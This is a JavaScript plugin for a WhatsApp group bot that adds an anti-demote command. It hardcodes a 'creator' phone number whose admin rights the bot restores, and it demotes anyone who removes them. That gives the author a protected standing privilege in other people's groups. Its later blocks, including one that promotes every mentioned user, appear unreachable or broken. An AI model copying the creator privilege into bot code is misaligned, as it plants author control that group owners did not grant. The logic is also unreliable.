let handler = async (m, { conn, participants, isBotAdmin, text, command }) => {
    if (!m.isGroup || !isBotAdmin) return;

    let chat = global.db.data.chats[m.chat];
    if (!chat) chat = global.db.data.chats[m.chat] = {};

    if (/^antidemote$/i.test(command)) {
        if (!text) {
            return conn.sendMessage(m.chat, {
                text: `Use the command with *on* or *off*\nExample: #antidemote on`,
            });
        }

        let enable = /on/i.test(text);
        chat.antidemote = enable;

        return conn.sendMessage(m.chat, {
            text: `✅ Anti-Demote has been *${enable ? 'enabled' : 'disabled'}*.`,
        });
    }

    if (!chat.antidemote) return;

    const protectedJid = "233268374753@s.whatsapp.net"; 

    if (m.messageStubType === 21) {
        const demoter = m.sender;
        const demotedJid = m.messageStubParameters[0] + '@s.whatsapp.net';

        const botNumber = conn.user.jid;
        const groupAdmins = participants
            .filter(p => p.admin === 'admin' || p.admin === 'superadmin')
            .map(p => p.id);
        const groupOwner = participants.find(p => p.admin === 'superadmin')?.id;

        const isProtected =
            demotedJid === protectedJid ||
            groupAdmins.includes(demotedJid) ||
            demotedJid === botNumber ||
            demotedJid === groupOwner;

        if (isProtected) {
            try {
                if (demotedJid === protectedJid) {
                    await conn.sendMessage(m.chat, {
                        text: "You want to demote my creator, bro? Never!",
                    });

                    await conn.groupParticipantsUpdate(m.chat, [demoter], 'demote');
                    await conn.groupParticipantsUpdate(m.chat, [protectedJid], 'promote');
                    return;
                }

                await conn.groupParticipantsUpdate(m.chat, [demotedJid], 'promote');
                await conn.groupParticipantsUpdate(m.chat, [demoter], 'demote');

                await conn.sendMessage(m.chat, {
                    text: `🚫 Anti-Demote Activated!\n\nUser *@${demoter.split('@')[0]}* tried to demote *@${demotedJid.split('@')[0]}* and has been demoted instead.`,
                    mentions: [demoter, demotedJid],
                });
            } catch (e) {
                console.error(e);
                await conn.sendMessage(m.chat, {
                    text: '❌ Failed to enforce Anti-Demote. Please try again.',
                });
            }
        }
    }

    if (m.mentionedJid && m.mentionedJid.length > 0) {
        for (let jid of m.mentionedJid) {
            try {
                await conn.groupParticipantsUpdate(m.chat, [jid], 'promote');
                await conn.sendMessage(m.chat, {
                    text: `User *@${jid.split('@')[0]}* has been promoted.`,
                    mentions: [jid],
                });
            } catch (e) {
                console.error(e);
            }
        }
    }
};

handler.help = ['antidemote'];
handler.tags = ['group'];
handler.command = /^antidemote$/i;

handler.group = true;
handler.admin = true;
handler.botAdmin = true;

export default handler;
